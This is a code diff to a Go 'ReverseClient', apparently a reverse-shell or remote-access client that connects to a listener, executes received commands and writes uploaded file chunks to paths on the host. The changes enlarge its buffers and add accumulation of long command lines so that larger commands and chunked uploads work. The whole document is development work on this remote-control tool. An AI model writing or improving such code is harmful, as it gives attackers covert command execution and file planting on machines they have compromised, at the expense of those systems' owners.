@@ -6,6 +6,7 @@ import (
 	"compress/gzip"
 	"crypto/tls"
 	"encoding/hex"
+	"errors"
 	"fmt"
 	"io"
 	"log"
@@ -72,8 +73,8 @@ func (rc *ReverseClient) Connect() error {
 	}
 
 	rc.conn = conn
-	rc.reader = bufio.NewReader(conn)
-	rc.writer = bufio.NewWriter(conn)
+	rc.reader = bufio.NewReaderSize(conn, 1024*1024) // allow large commands (chunked uploads)
+	rc.writer = bufio.NewWriterSize(conn, 1024*1024)
 	rc.isConnected = true
 
 	log.Println("Connected to listener successfully")
@@ -113,11 +114,23 @@ func (rc *ReverseClient) ExecuteCommand(command string) string {
 
 // HandleCommands listens for commands and executes them
 func (rc *ReverseClient) HandleCommands() error {
+	var cmdBuffer strings.Builder
+
 	for {
 		// Set read deadline to allow graceful shutdown
 		rc.conn.SetReadDeadline(time.Now().Add(1 * time.Second))
 		line, err := rc.reader.ReadString('\n')
 		rc.conn.SetReadDeadline(time.Time{})
+
+		cmdBuffer.WriteString(line)
+
+		if errors.Is(err, bufio.ErrBufferFull) {
+			// Command line exceeded buffer; keep accumulating until newline
+			if cmdBuffer.Len() > 10*1024*1024 { // prevent unbounded growth
+				cmdBuffer.Reset()
+			}
+			continue
+		}
 
 		if err != nil {
 			if err == io.EOF {
@@ -129,7 +142,8 @@ func (rc *ReverseClient) HandleCommands() error {
 			return fmt.Errorf("read error: %v", err)
 		}
 
-		command := strings.TrimSpace(line)
+		command := strings.TrimSpace(cmdBuffer.String())
+		cmdBuffer.Reset()
 		if command == "" {
 			continue
 		}
@@ -185,7 +199,7 @@ func (rc *ReverseClient) HandleCommands() error {
 				continue
 			}
 			remotePath := parts[1]
-			
+
 			// Reconstruct and write file
 			fullData := strings.Join(rc.uploadChunks, "")
 			data, err := decompressHex(fullData)
